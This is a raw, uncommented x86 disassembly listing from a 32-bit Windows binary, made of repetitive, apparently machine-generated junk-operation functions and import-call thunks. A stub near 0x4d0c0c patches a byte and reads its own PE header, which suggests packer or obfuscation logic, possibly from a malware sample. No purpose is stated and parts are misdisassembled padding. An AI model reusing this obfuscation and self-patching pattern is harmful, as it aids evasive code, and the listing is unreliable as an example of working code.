  4d0792:	push   ebp
  4d0793:	mov    ebp,esp
  4d0795:	sub    esp,0x44
  4d0798:	mov    ecx,0x4d3184
  4d079d:	xor    DWORD PTR [ebp-0x38],0xffffffb8
  4d07a1:	push   ecx
  4d07a2:	push   esi
  4d07a3:	push   esi
  4d07a4:	push   DWORD PTR [ecx+0x150]
  4d07aa:	push   DWORD PTR [ecx+0x17c]
  4d07b0:	call   0x4d1164
  4d07b5:	add    esp,0x10
  4d07b8:	pop    ecx
  4d07b9:	push   ecx
  4d07ba:	push   0x0
  4d07bc:	call   0x4d09c0
  4d07c1:	add    esp,0x4
  4d07c4:	pop    ecx
  4d07c5:	push   ecx
  4d07c6:	push   0x0
  4d07c8:	call   0x4d1434
  4d07cd:	add    esp,0x4
  4d07d0:	pop    ecx
  4d07d1:	add    esp,0x44
  4d07d4:	pop    ebp
  4d07d5:	ret    
  4d07d6:	add    BYTE PTR [eax],al
  4d07d8:	mov    edi,edi
  4d07da:	push   ebp
  4d07db:	mov    ebp,esp
  4d07dd:	sub    esp,0x30
  4d07e0:	lea    edi,[edx+0x50]
  4d07e3:	and    DWORD PTR [ebp-0x8],ebx
  4d07e6:	push   edi
  4d07e7:	push   eax
  4d07e8:	push   ebx
  4d07e9:	push   eax
  4d07ea:	push   ebx
  4d07eb:	call   0x4d12c8
  4d07f0:	add    esp,0x10
  4d07f3:	pop    edi
  4d07f4:	push   edi
  4d07f5:	call   0x4d0d58
  4d07fa:	add    esp,0x4
  4d07fd:	pop    edi
  4d07fe:	push   edi
  4d07ff:	call   0x4d10ac
  4d0804:	add    esp,0x4
  4d0807:	pop    edi
  4d0808:	add    esp,0x30
  4d080b:	pop    ebp
  4d080c:	ret    
  4d080d:	add    BYTE PTR [eax],al
  4d080f:	add    BYTE PTR [edi-0x1],bl
  4d0812:	adc    eax,0x4d2098
  4d0817:	call   edi
  4d0819:	add    BYTE PTR [eax],al
  4d081b:	add    BYTE PTR [edi-0x1],bl
  4d081e:	adc    eax,0x4d2080
  4d0823:	call   edi
  4d0825:	add    BYTE PTR [eax],al
  4d0827:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d082d:	sub    esp,0x54
  4d0830:	lea    edi,[edx-0x68]
  4d0833:	or     DWORD PTR [ebp-0x8],edx
  4d0836:	push   edi
  4d0837:	push   DWORD PTR [edi+0x1ec]
  4d083d:	push   eax
  4d083e:	push   DWORD PTR [edi+0x180]
  4d0844:	call   0x4d0f84
  4d0849:	add    esp,0xc
  4d084c:	pop    edi
  4d084d:	push   edi
  4d084e:	mov    ecx,0x0
  4d0853:	push   ecx
  4d0854:	call   0x4d10a0
  4d0859:	add    esp,0x4
  4d085c:	pop    edi
  4d085d:	push   edi
  4d085e:	mov    eax,0x0
  4d0863:	push   eax
  4d0864:	call   0x4d1108
  4d0869:	add    esp,0x4
  4d086c:	pop    edi
  4d086d:	add    esp,0x54
  4d0870:	pop    ebp
  4d0871:	ret    
  4d0872:	add    BYTE PTR [eax],al
  4d0874:	mov    edi,edi
  4d0876:	push   ebp
  4d0877:	mov    ebp,esp
  4d0879:	sub    esp,0x30
  4d087c:	mov    ecx,0x4d31ec
  4d0881:	mov    edx,DWORD PTR [ebp-0x28]
  4d0884:	push   ecx
  4d0885:	push   esi
  4d0886:	push   edx
  4d0887:	push   edi
  4d0888:	push   edx
  4d0889:	call   0x4d0b28
  4d088e:	add    esp,0x10
  4d0891:	pop    ecx
  4d0892:	push   ecx
  4d0893:	mov    esi,0x0
  4d0898:	push   esi
  4d0899:	call   0x4d15a8
  4d089e:	add    esp,0x4
  4d08a1:	pop    ecx
  4d08a2:	push   ecx
  4d08a3:	push   0x0
  4d08a5:	call   0x4d09c0
  4d08aa:	add    esp,0x4
  4d08ad:	pop    ecx
  4d08ae:	add    esp,0x30
  4d08b1:	pop    ebp
  4d08b2:	ret    
  4d08b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08b9:	sub    esp,0x2c
  4d08bc:	lea    esi,[edi-0x1c]
  4d08bf:	xor    DWORD PTR [ebp-0x4],0x6211
  4d08c6:	push   0x0
  4d08c8:	call   0x4d1218
  4d08cd:	add    esp,0x4
  4d08d0:	push   esi
  4d08d1:	push   DWORD PTR [esi+0x2c]
  4d08d4:	push   ecx
  4d08d5:	call   0x4d1310
  4d08da:	add    esp,0x8
  4d08dd:	pop    esi
  4d08de:	push   0x0
  4d08e0:	call   0x4d12bc
  4d08e5:	add    esp,0x4
  4d08e8:	add    esp,0x2c
  4d08eb:	pop    ebp
  4d08ec:	ret    
  4d08ed:	add    BYTE PTR [eax],al
  4d08ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08f5:	sub    esp,0x48
  4d08f8:	lea    ecx,[edx-0x54]
  4d08fb:	adc    edx,0x60f5
  4d0901:	push   ecx
  4d0902:	push   edx
  4d0903:	push   edi
  4d0904:	push   DWORD PTR [ecx+0x168]
  4d090a:	push   eax
  4d090b:	call   0x4d13f4
  4d0910:	add    esp,0x10
  4d0913:	pop    ecx
  4d0914:	push   ecx
  4d0915:	call   0x4d0d58
  4d091a:	add    esp,0x4
  4d091d:	pop    ecx
  4d091e:	push   ecx
  4d091f:	lea    ecx,[ecx-0xb4]
  4d0925:	push   ecx
  4d0926:	call   0x4d0b10
  4d092b:	add    esp,0x4
  4d092e:	test   eax,eax
  4d0930:	jne    0x4d091f
  4d0932:	pop    ecx
  4d0933:	add    esp,0x48
  4d0936:	pop    ebp
  4d0937:	ret    
  4d0938:	mov    edi,edi
  4d093a:	push   ebp
  4d093b:	mov    ebp,esp
  4d093d:	sub    esp,0x48
  4d0940:	lea    ebx,ds:0x4d3060
  4d0946:	or     DWORD PTR [ebp-0x4],esi
  4d0949:	push   ebx
  4d094a:	push   edx
  4d094b:	push   esi
  4d094c:	call   0x4d0e8c
  4d0951:	add    esp,0x8
  4d0954:	pop    ebx
  4d0955:	call   0x4d0d58
  4d095a:	add    esp,0x4
  4d095d:	push   0x0
  4d095f:	call   0x4d1434
  4d0964:	add    esp,0x4
  4d0967:	add    esp,0x48
  4d096a:	pop    ebp
  4d096b:	ret    
  4d096c:	pop    edi
  4d096d:	call   DWORD PTR ds:0x4d2094
  4d0973:	call   edi
  4d0975:	add    BYTE PTR [eax],al
  4d0977:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d097d:	sub    esp,0x20
  4d0980:	mov    eax,0x4d3198
  4d0985:	sbb    edi,DWORD PTR [eax+0x50]
  4d0988:	push   eax
  4d0989:	push   edx
  4d098a:	push   ebx
  4d098b:	push   DWORD PTR [eax+0x104]
  4d0991:	call   0x4d0f34
  4d0996:	add    esp,0xc
  4d0999:	pop    eax
  4d099a:	push   eax
  4d099b:	mov    eax,0x0
  4d09a0:	push   eax
  4d09a1:	call   0x4d1218
  4d09a6:	add    esp,0x4
  4d09a9:	pop    eax
  4d09aa:	push   eax
  4d09ab:	mov    eax,0x0
  4d09b0:	push   eax
  4d09b1:	call   0x4d1434
  4d09b6:	add    esp,0x4
  4d09b9:	pop    eax
  4d09ba:	add    esp,0x20
  4d09bd:	pop    ebp
  4d09be:	ret    
  4d09bf:	add    BYTE PTR [edi-0x1],bl
  4d09c2:	adc    eax,0x4d2040
  4d09c7:	call   edi
  4d09c9:	add    BYTE PTR [eax],al
  4d09cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09d1:	sub    esp,0x44
  4d09d4:	lea    ebx,[ecx+0xa0]
  4d09da:	or     DWORD PTR [ebp-0x8],0xffffffbc
  4d09de:	push   ebx
  4d09df:	push   eax
  4d09e0:	push   DWORD PTR [ebx+0x1a8]
  4d09e6:	push   ecx
  4d09e7:	call   0x4d0da8
  4d09ec:	add    esp,0xc
  4d09ef:	pop    ebx
  4d09f0:	push   0x0
  4d09f2:	call   0x4d12bc
  4d09f7:	add    esp,0x4
  4d09fa:	call   0x4d10ac
  4d09ff:	add    esp,0x4
  4d0a02:	add    esp,0x44
  4d0a05:	pop    ebp
  4d0a06:	ret    
  4d0a07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a0d:	sub    esp,0x34
  4d0a10:	lea    ecx,ds:0x4d3020
  4d0a16:	cmp    ecx,0xe3e
  4d0a1c:	jb     0x4d0a0b
  4d0a1e:	push   ecx
  4d0a1f:	push   DWORD PTR [ecx+0x1f8]
  4d0a25:	push   edx
  4d0a26:	push   edx
  4d0a27:	push   DWORD PTR [ecx+0x15c]
  4d0a2d:	call   0x4d127c
  4d0a32:	add    esp,0x10
  4d0a35:	pop    ecx
  4d0a36:	push   ecx
  4d0a37:	push   0x0
  4d0a39:	call   0x4d10a0
  4d0a3e:	add    esp,0x4
  4d0a41:	pop    ecx
  4d0a42:	push   ecx
  4d0a43:	mov    esi,0xfffffff4
  4d0a48:	push   esi
  4d0a49:	call   0x4d0aa4
  4d0a4e:	add    esp,0x4
  4d0a51:	pop    ecx
  4d0a52:	add    esp,0x34
  4d0a55:	pop    ebp
  4d0a56:	ret    
  4d0a57:	add    BYTE PTR [edi-0x1],bl
  4d0a5a:	adc    eax,0x4d2078
  4d0a5f:	call   edi
  4d0a61:	add    BYTE PTR [eax],al
  4d0a63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a69:	sub    esp,0x30
  4d0a6c:	mov    ecx,0x4d316c
  4d0a71:	and    DWORD PTR [ebp-0x1c],edi
  4d0a74:	push   ecx
  4d0a75:	mov    esi,0x0
  4d0a7a:	push   esi
  4d0a7b:	call   0x4d09c0
  4d0a80:	add    esp,0x4
  4d0a83:	pop    ecx
  4d0a84:	push   ecx
  4d0a85:	push   esi
  4d0a86:	push   eax
  4d0a87:	call   0x4d1490
  4d0a8c:	add    esp,0x8
  4d0a8f:	pop    ecx
  4d0a90:	push   ecx
  4d0a91:	push   0x0
  4d0a93:	call   0x4d1218
  4d0a98:	add    esp,0x4
  4d0a9b:	pop    ecx
  4d0a9c:	add    esp,0x30
  4d0a9f:	pop    ebp
  4d0aa0:	ret    
  4d0aa1:	add    BYTE PTR [eax],al
  4d0aa3:	add    BYTE PTR [edi-0x1],bl
  4d0aa6:	adc    eax,0x4d2000
  4d0aab:	call   edi
  4d0aad:	add    BYTE PTR [eax],al
  4d0aaf:	add    BYTE PTR [edi-0x1],bl
  4d0ab2:	adc    eax,0x4d209c
  4d0ab7:	call   edi
  4d0ab9:	add    BYTE PTR [eax],al
  4d0abb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ac1:	sub    esp,0x3c
  4d0ac4:	mov    edx,0x4d3188
  4d0ac9:	cmp    edx,0x3ba0
  4d0acf:	jb     0x4d0abf
  4d0ad1:	push   edx
  4d0ad2:	lea    ebx,[edx-0x188]
  4d0ad8:	push   ebx
  4d0ad9:	call   0x4d0b10
  4d0ade:	add    esp,0x4
  4d0ae1:	test   eax,eax
  4d0ae3:	jne    0x4d0ad2
  4d0ae5:	pop    edx
  4d0ae6:	push   edx
  4d0ae7:	push   DWORD PTR [edx+0xd4]
  4d0aed:	push   ecx
  4d0aee:	push   DWORD PTR [edx+0x1b0]
  4d0af4:	call   0x4d1058
  4d0af9:	add    esp,0xc
  4d0afc:	pop    edx
  4d0afd:	push   edx
  4d0afe:	push   0x0
  4d0b00:	call   0x4d09c0
  4d0b05:	add    esp,0x4
  4d0b08:	pop    edx
  4d0b09:	add    esp,0x3c
  4d0b0c:	pop    ebp
  4d0b0d:	ret    
  4d0b0e:	add    BYTE PTR [eax],al
  4d0b10:	pop    edi
  4d0b11:	call   DWORD PTR ds:0x4d2020
  4d0b17:	call   edi
  4d0b19:	add    BYTE PTR [eax],al
  4d0b1b:	add    BYTE PTR [edi-0x1],bl
  4d0b1e:	adc    eax,0x4d2074
  4d0b23:	call   edi
  4d0b25:	add    BYTE PTR [eax],al
  4d0b27:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b2d:	sub    esp,0x30
  4d0b30:	lea    eax,ds:0x4d30f4
  4d0b36:	adc    DWORD PTR [eax+0x4c],esi
  4d0b39:	push   eax
  4d0b3a:	lea    ebx,[eax-0xf4]
  4d0b40:	push   ebx
  4d0b41:	call   0x4d0b10
  4d0b46:	add    esp,0x4
  4d0b49:	test   eax,eax
  4d0b4b:	jne    0x4d0b3a
  4d0b4d:	pop    eax
  4d0b4e:	push   eax
  4d0b4f:	push   ecx
  4d0b50:	push   DWORD PTR [eax+0x80]
  4d0b56:	push   edi
  4d0b57:	push   edi
  4d0b58:	call   0x4d10b8
  4d0b5d:	add    esp,0x10
  4d0b60:	pop    eax
  4d0b61:	push   eax
  4d0b62:	lea    edx,[eax-0xf4]
  4d0b68:	push   edx
  4d0b69:	call   0x4d0b10
  4d0b6e:	add    esp,0x4
  4d0b71:	test   eax,eax
  4d0b73:	jne    0x4d0b62
  4d0b75:	pop    eax
  4d0b76:	add    esp,0x30
  4d0b79:	pop    ebp
  4d0b7a:	ret    
  4d0b7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b81:	sub    esp,0x24
  4d0b84:	lea    edi,ds:0x4d30a8
  4d0b8a:	mov    DWORD PTR [edi+0xf8],0x422a
  4d0b94:	push   edi
  4d0b95:	push   DWORD PTR [edi+0x124]
  4d0b9b:	push   DWORD PTR [edi+0x7c]
  4d0b9e:	push   ecx
  4d0b9f:	call   0x4d08b4
  4d0ba4:	add    esp,0xc
  4d0ba7:	pop    edi
  4d0ba8:	push   edi
  4d0ba9:	mov    edi,0xfffffff4
  4d0bae:	push   edi
  4d0baf:	call   0x4d0aa4
  4d0bb4:	add    esp,0x4
  4d0bb7:	pop    edi
  4d0bb8:	push   edi
  4d0bb9:	lea    ecx,[edi-0xa8]
  4d0bbf:	push   ecx
  4d0bc0:	call   0x4d0b10
  4d0bc5:	add    esp,0x4
  4d0bc8:	test   eax,eax
  4d0bca:	jne    0x4d0bb9
  4d0bcc:	pop    edi
  4d0bcd:	add    esp,0x24
  4d0bd0:	pop    ebp
  4d0bd1:	ret    
  4d0bd2:	add    BYTE PTR [eax],al
  4d0bd4:	pop    edi
  4d0bd5:	call   DWORD PTR ds:0x4d2090
  4d0bdb:	call   edi
  4d0bdd:	add    BYTE PTR [eax],al
  4d0bdf:	add    BYTE PTR [edi-0x1],bl
  4d0be2:	adc    eax,0x4d2048
  4d0be7:	call   edi
  4d0be9:	add    BYTE PTR [eax],al
  4d0beb:	add    BYTE PTR [edi-0x1],bl
  4d0bee:	adc    eax,0x4d20a0
  4d0bf3:	call   edi
  4d0bf5:	add    BYTE PTR [eax],al
  4d0bf7:	add    BYTE PTR [edi+0x2b],dl
  4d0bfa:	call   DWORD PTR [edi+0x57]
  4d0bfd:	push   edi
  4d0bfe:	push   edi
  4d0bff:	call   0x4d10ac
  4d0c04:	sub    esp,0xfffffffc
  4d0c07:	call   0x4d1224
  4d0c0c:	push   0x2
  4d0c0e:	xor    eax,eax
  4d0c10:	sub    eax,0x4d3030
  4d0c15:	neg    eax
  4d0c17:	push   0x0
  4d0c19:	lea    ecx,[eax+0x7]
  4d0c1c:	add    BYTE PTR [ecx],0x41
  4d0c1f:	push   eax
  4d0c20:	call   0x4d0d40
  4d0c25:	pop    edi
  4d0c26:	pop    edi
  4d0c27:	pop    edi
  4d0c28:	lea    ecx,[eax+0x3b]
  4d0c2b:	mov    edi,DWORD PTR [ecx]
  4d0c2d:	lea    eax,[eax+edi*1]
  4d0c30:	mov    eax,DWORD PTR [eax+0x28]
  4d0c33:	pusha  
  4d0c34:	mov    ah,0x45
  4d0c36:	sub    al,ah
  4d0c38:	ja     0x4d0748
  4d0c3e:	popa   
  4d0c3f:	ret    
  4d0c40:	mov    edi,edi
  4d0c42:	push   ebp
  4d0c43:	mov    ebp,esp
  4d0c45:	sub    esp,0x34
  4d0c48:	lea    eax,ds:0x4d3008
  4d0c4e:	xor    DWORD PTR [eax+0x18],edx
  4d0c51:	push   eax
  4d0c52:	push   0xfffffff4
  4d0c54:	call   0x4d0aa4
  4d0c59:	add    esp,0x4
  4d0c5c:	pop    eax
  4d0c5d:	push   eax
  4d0c5e:	push   DWORD PTR [eax+0x1d8]
  4d0c64:	push   edx
  4d0c65:	call   0x4d0d64
  4d0c6a:	add    esp,0x8
  4d0c6d:	pop    eax
  4d0c6e:	push   eax
  4d0c6f:	call   0x4d0f1c
  4d0c74:	add    esp,0x4
  4d0c77:	pop    eax
  4d0c78:	add    esp,0x34
  4d0c7b:	pop    ebp
  4d0c7c:	ret    
  4d0c7d:	add    BYTE PTR [eax],al
  4d0c7f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c85:	sub    esp,0x38
  4d0c88:	mov    edx,0x4d31a0
  4d0c8d:	adc    DWORD PTR [ebp-0xc],0xffffa29c
  4d0c94:	push   edx
  4d0c95:	mov    edx,0x0
  4d0c9a:	push   edx
  4d0c9b:	call   0x4d0d34
  4d0ca0:	add    esp,0x4
  4d0ca3:	pop    edx
  4d0ca4:	push   edx
  4d0ca5:	push   eax
  4d0ca6:	push   DWORD PTR [edx+0x184]
  4d0cac:	call   0x4d1114
  4d0cb1:	add    esp,0x8
  4d0cb4:	pop    edx
  4d0cb5:	push   edx
  4d0cb6:	push   0x0
  4d0cb8:	call   0x4d0d34
  4d0cbd:	add    esp,0x4
  4d0cc0:	pop    edx
  4d0cc1:	add    esp,0x38
  4d0cc4:	pop    ebp
  4d0cc5:	ret    
  4d0cc6:	add    BYTE PTR [eax],al
  4d0cc8:	pop    edi
  4d0cc9:	call   DWORD PTR ds:0x4d200c
  4d0ccf:	call   edi
  4d0cd1:	add    BYTE PTR [eax],al
  4d0cd3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cd9:	sub    esp,0x44
  4d0cdc:	lea    edi,ds:0x4d3044
  4d0ce2:	xor    DWORD PTR [edi+0xa4],ebx
  4d0ce8:	push   edi
  4d0ce9:	push   DWORD PTR [edi+0xcc]
  4d0cef:	push   DWORD PTR [edi+0xbc]
  4d0cf5:	push   DWORD PTR [edi+0x1fc]
  4d0cfb:	call   0x4d1000
  4d0d00:	add    esp,0xc
  4d0d03:	pop    edi
  4d0d04:	push   edi
  4d0d05:	push   0x0
  4d0d07:	call   0x4d15a8
  4d0d0c:	add    esp,0x4
  4d0d0f:	pop    edi
  4d0d10:	push   edi
  4d0d11:	mov    edi,0x0
  4d0d16:	push   edi
  4d0d17:	call   0x4d1108
  4d0d1c:	add    esp,0x4
  4d0d1f:	pop    edi
  4d0d20:	add    esp,0x44
  4d0d23:	pop    ebp
  4d0d24:	ret    
  4d0d25:	add    BYTE PTR [eax],al
  4d0d27:	add    BYTE PTR [edi-0x1],bl
  4d0d2a:	adc    eax,0x4d205c
  4d0d2f:	call   edi
  4d0d31:	add    BYTE PTR [eax],al
  4d0d33:	add    BYTE PTR [edi-0x1],bl
  4d0d36:	adc    eax,0x4d206c
  4d0d3b:	call   edi
  4d0d3d:	add    BYTE PTR [eax],al
  4d0d3f:	add    BYTE PTR [edi-0x1],bl
  4d0d42:	adc    eax,0x4d2008
  4d0d47:	call   edi
  4d0d49:	add    BYTE PTR [eax],al
  4d0d4b:	add    BYTE PTR [edi-0x1],bl
  4d0d4e:	adc    eax,0x4d2068
  4d0d53:	call   edi
  4d0d55:	add    BYTE PTR [eax],al
  4d0d57:	add    BYTE PTR [edi-0x1],bl
  4d0d5a:	adc    eax,0x4d2038
  4d0d5f:	call   edi
  4d0d61:	add    BYTE PTR [eax],al
  4d0d63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d69:	sub    esp,0x38
  4d0d6c:	lea    edi,ds:0x4d31a4
  4d0d72:	mov    edx,DWORD PTR [edi-0x84]
  4d0d78:	push   edi
  4d0d79:	push   DWORD PTR [edi+0x28]
  4d0d7c:	push   ecx
  4d0d7d:	push   ebx
  4d0d7e:	call   0x4d11ac
  4d0d83:	add    esp,0xc
  4d0d86:	pop    edi
  4d0d87:	push   edi
  4d0d88:	push   0x0
  4d0d8a:	call   0x4d0f28
  4d0d8f:	add    esp,0x4
  4d0d92:	pop    edi
  4d0d93:	push   edi
  4d0d94:	mov    esi,0x0
  4d0d99:	push   esi
  4d0d9a:	call   0x4d15a8
  4d0d9f:	add    esp,0x4
  4d0da2:	pop    edi
  4d0da3:	add    esp,0x38
  4d0da6:	pop    ebp
  4d0da7:	ret    
  4d0da8:	mov    edi,edi
  4d0daa:	push   ebp
  4d0dab:	mov    ebp,esp
  4d0dad:	sub    esp,0x50
  4d0db0:	lea    ecx,[ebx-0xb8]
  4d0db6:	add    ebx,DWORD PTR [ebp-0x38]
  4d0db9:	push   ecx
  4d0dba:	push   esi
  4d0dbb:	push   DWORD PTR [ecx+0xe0]
  4d0dc1:	call   0x4d0df8
  4d0dc6:	add    esp,0x8
  4d0dc9:	pop    ecx
  4d0dca:	push   ecx
  4d0dcb:	mov    eax,0x0
  4d0dd0:	push   eax
  4d0dd1:	call   0x4d1434
  4d0dd6:	add    esp,0x4
  4d0dd9:	pop    ecx
  4d0dda:	push   ecx
  4d0ddb:	call   0x4d0f1c
  4d0de0:	add    esp,0x4
  4d0de3:	pop    ecx
  4d0de4:	add    esp,0x50
  4d0de7:	pop    ebp
  4d0de8:	ret    
  4d0de9:	add    BYTE PTR [eax],al
  4d0deb:	add    BYTE PTR [edi-0x1],bl
  4d0dee:	adc    eax,0x4d207c
  4d0df3:	call   edi
  4d0df5:	add    BYTE PTR [eax],al
  4d0df7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dfd:	sub    esp,0x28
  4d0e00:	lea    edx,[ecx+0x30]
  4d0e03:	add    esi,ecx
  4d0e05:	push   edx
  4d0e06:	push   DWORD PTR [edx+0x170]
  4d0e0c:	push   DWORD PTR [edx+0xc4]
  4d0e12:	push   esi
  4d0e13:	push   DWORD PTR [edx+0x18c]
  4d0e19:	call   0x4d0874
  4d0e1e:	add    esp,0x10
  4d0e21:	pop    edx
  4d0e22:	push   edx
  4d0e23:	mov    esi,0x0
  4d0e28:	push   esi
  4d0e29:	call   0x4d15a8
  4d0e2e:	add    esp,0x4
  4d0e31:	pop    edx
  4d0e32:	push   edx
  4d0e33:	push   0x0
  4d0e35:	call   0x4d1218
  4d0e3a:	add    esp,0x4
  4d0e3d:	pop    edx
  4d0e3e:	add    esp,0x28
  4d0e41:	pop    ebp
  4d0e42:	ret    
  4d0e43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e49:	sub    esp,0x40
  4d0e4c:	lea    ecx,[eax+0x94]
  4d0e52:	xor    eax,edi
  4d0e54:	push   ecx
  4d0e55:	mov    ecx,0x0
  4d0e5a:	push   ecx
  4d0e5b:	call   0x4d1434
  4d0e60:	add    esp,0x4
  4d0e63:	pop    ecx
  4d0e64:	push   ecx
  4d0e65:	push   DWORD PTR [ecx+0x16c]
  4d0e6b:	push   ebx
  4d0e6c:	call   0x4d0938
  4d0e71:	add    esp,0x8
  4d0e74:	pop    ecx
  4d0e75:	push   ecx
  4d0e76:	mov    edx,0x0
  4d0e7b:	push   edx
  4d0e7c:	call   0x4d0f28
  4d0e81:	add    esp,0x4
  4d0e84:	pop    ecx
  4d0e85:	add    esp,0x40
  4d0e88:	pop    ebp
  4d0e89:	ret    
  4d0e8a:	add    BYTE PTR [eax],al
  4d0e8c:	mov    edi,edi
  4d0e8e:	push   ebp
  4d0e8f:	mov    ebp,esp
  4d0e91:	sub    esp,0x24
  4d0e94:	lea    edi,[ebx+0x140]
  4d0e9a:	mov    DWORD PTR [edi-0x50],0x2535
  4d0ea1:	push   edi
  4d0ea2:	push   DWORD PTR [edi+0xdc]
  4d0ea8:	push   DWORD PTR [edi+0x48]
  4d0eab:	push   DWORD PTR [edi+0x118]
  4d0eb1:	call   0x4d1230
  4d0eb6:	add    esp,0xc
  4d0eb9:	pop    edi
  4d0eba:	push   edi
  4d0ebb:	call   0x4d10ac
  4d0ec0:	add    esp,0x4
  4d0ec3:	pop    edi
  4d0ec4:	push   edi
  4d0ec5:	mov    ebx,0x0
  4d0eca:	push   ebx
  4d0ecb:	call   0x4d12bc
  4d0ed0:	add    esp,0x4
  4d0ed3:	pop    edi
  4d0ed4:	add    esp,0x24
  4d0ed7:	pop    ebp
  4d0ed8:	ret    
  4d0ed9:	add    BYTE PTR [eax],al
  4d0edb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ee1:	sub    esp,0x40
  4d0ee4:	lea    ebx,ds:0x4d30b0
  4d0eea:	cmp    ebx,0x77a2
  4d0ef0:	je     0x4d0edf
  4d0ef2:	push   ebx
  4d0ef3:	push   edi
  4d0ef4:	push   DWORD PTR [ebx+0x90]
  4d0efa:	call   0x4d0790
  4d0eff:	add    esp,0x8
  4d0f02:	pop    ebx
  4d0f03:	push   0x0
  4d0f05:	call   0x4d12bc
  4d0f0a:	add    esp,0x4
  4d0f0d:	push   0x0
  4d0f0f:	call   0x4d1108
  4d0f14:	add    esp,0x4
  4d0f17:	add    esp,0x40
  4d0f1a:	pop    ebp
  4d0f1b:	ret    
  4d0f1c:	pop    edi
  4d0f1d:	call   DWORD PTR ds:0x4d2010
  4d0f23:	call   edi
  4d0f25:	add    BYTE PTR [eax],al
  4d0f27:	add    BYTE PTR [edi-0x1],bl
  4d0f2a:	adc    eax,0x4d2028
  4d0f2f:	call   edi
  4d0f31:	add    BYTE PTR [eax],al
  4d0f33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f39:	sub    esp,0x60
  4d0f3c:	lea    edx,ds:0x4d30b8
  4d0f42:	xor    eax,0x1d01
  4d0f47:	push   edx
  4d0f48:	mov    edx,0x0
  4d0f4d:	push   edx
  4d0f4e:	call   0x4d1094
  4d0f53:	add    esp,0x4
  4d0f56:	pop    edx
  4d0f57:	push   edx
  4d0f58:	push   esi
  4d0f59:	push   DWORD PTR [edx+0x8]
  4d0f5c:	push   DWORD PTR [edx+0x1f8]
  4d0f62:	push   DWORD PTR [edx+0x19c]
  4d0f68:	call   0x4d0a64
  4d0f6d:	add    esp,0x10
  4d0f70:	pop    edx
  4d0f71:	push   edx
  4d0f72:	push   0x0
  4d0f74:	call   0x4d1094
  4d0f79:	add    esp,0x4
  4d0f7c:	pop    edx
  4d0f7d:	add    esp,0x60
  4d0f80:	pop    ebp
  4d0f81:	ret    
  4d0f82:	add    BYTE PTR [eax],al
  4d0f84:	mov    edi,edi
  4d0f86:	push   ebp
  4d0f87:	mov    ebp,esp
  4d0f89:	sub    esp,0x50
  4d0f8c:	mov    ebx,0x4d31a4
  4d0f91:	sbb    DWORD PTR [ebp-0x2c],0xffffff8f
  4d0f95:	push   ebx
  4d0f96:	push   edi
  4d0f97:	push   eax
  4d0f98:	push   edx
  4d0f99:	call   0x4d1440
  4d0f9e:	add    esp,0xc
  4d0fa1:	pop    ebx
  4d0fa2:	call   0x4d10ac
  4d0fa7:	add    esp,0x4
  4d0faa:	push   0x0
  4d0fac:	call   0x4d09c0
  4d0fb1:	add    esp,0x4
  4d0fb4:	add    esp,0x50
  4d0fb7:	pop    ebp
  4d0fb8:	ret    
  4d0fb9:	add    BYTE PTR [eax],al
  4d0fbb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fc1:	sub    esp,0x40
  4d0fc4:	lea    ebx,[esi-0x5c]
  4d0fc7:	or     DWORD PTR [ebx+0x5c],0xffffffb0
  4d0fcb:	push   ebx
  4d0fcc:	push   DWORD PTR [ebx+0xc]
  4d0fcf:	push   DWORD PTR [ebx+0x138]
  4d0fd5:	push   edi
  4d0fd6:	push   edi
  4d0fd7:	call   0x4d1564
  4d0fdc:	add    esp,0x10
  4d0fdf:	pop    ebx
  4d0fe0:	push   0xfffffff4
  4d0fe2:	call   0x4d0aa4
  4d0fe7:	add    esp,0x4
  4d0fea:	mov    edx,0x0
  4d0fef:	push   edx
  4d0ff0:	call   0x4d0d34
  4d0ff5:	add    esp,0x4
  4d0ff8:	add    esp,0x40
  4d0ffb:	pop    ebp
  4d0ffc:	ret    
  4d0ffd:	add    BYTE PTR [eax],al
  4d0fff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1005:	sub    esp,0x24
  4d1008:	lea    ecx,[edi+0x18c]
  4d100e:	and    DWORD PTR [ecx-0xc4],0x1ddc
  4d1018:	push   ecx
  4d1019:	mov    edi,0x0
  4d101e:	push   edi
  4d101f:	call   0x4d1434
  4d1024:	add    esp,0x4
  4d1027:	pop    ecx
  4d1028:	push   ecx
  4d1029:	push   esi
  4d102a:	push   ebx
  4d102b:	call   0x4d14d4
  4d1030:	add    esp,0x8
  4d1033:	pop    ecx
  4d1034:	push   ecx
  4d1035:	mov    eax,0x0
  4d103a:	push   eax
  4d103b:	call   0x4d0f28
  4d1040:	add    esp,0x4
  4d1043:	pop    ecx
  4d1044:	add    esp,0x24
  4d1047:	pop    ebp
  4d1048:	ret    
  4d1049:	add    BYTE PTR [eax],al
  4d104b:	add    BYTE PTR [edi-0x1],bl
  4d104e:	adc    eax,0x4d2070
  4d1053:	call   edi
  4d1055:	add    BYTE PTR [eax],al
  4d1057:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d105d:	sub    esp,0x24
  4d1060:	lea    esi,[edx-0x130]
  4d1066:	add    ebx,0xffffa67b
  4d106c:	push   esi
  4d106d:	push   eax
  4d106e:	push   DWORD PTR [esi+0x3c]
  4d1071:	push   DWORD PTR [esi+0x3c]
  4d1074:	call   0x4d06f8
  4d1079:	add    esp,0xc
  4d107c:	pop    esi
  4d107d:	push   0x0
  4d107f:	call   0x4d1108
  4d1084:	add    esp,0x4
  4d1087:	call   0x4d0f1c
  4d108c:	add    esp,0x4
  4d108f:	add    esp,0x24
  4d1092:	pop    ebp
  4d1093:	ret    
  4d1094:	pop    edi
  4d1095:	call   DWORD PTR ds:0x4d2054
  4d109b:	call   edi
